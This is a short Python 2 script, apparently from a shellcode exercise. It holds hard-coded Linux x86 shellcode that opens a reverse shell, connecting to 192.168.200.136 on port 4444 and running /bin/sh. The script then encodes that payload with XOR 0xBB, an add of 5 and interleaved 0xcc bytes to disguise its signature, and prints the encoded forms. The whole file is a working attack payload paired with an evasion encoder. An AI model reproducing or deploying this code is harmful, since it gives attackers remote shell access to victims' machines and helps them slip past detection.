#!/usr/bin/python

# Python Encoder 

# xor with 0XBB, add 5 byte, then insert the 0xcc next in between

shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x89\xc3\xb1\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xdb\x89\xf3\x66\xb8\x6a\x01\x57\x68\xc0\xa8\xc8\x88\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x66\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

#loop through the shellcode

for x in bytearray(shellcode) :

	y = x^0xBB #XOR the current code with 0xBB

	y = y + 0x5 # add the 5 bytes to the XORed number

	encoded += '\\x'
	encoded += '%02x' % (y & 0xff) #format the shellcode
	encoded += '\\x%02x' % 0xcc #add the 0xcc next to the current code

	encoded2 += '0x'
	encoded2 += '%02x,' %(y & 0xff)
	encoded2 += '0x%02x,' % 0xcc


print encoded

print encoded2

print 'Len: %d' % len(bytearray(encoded))
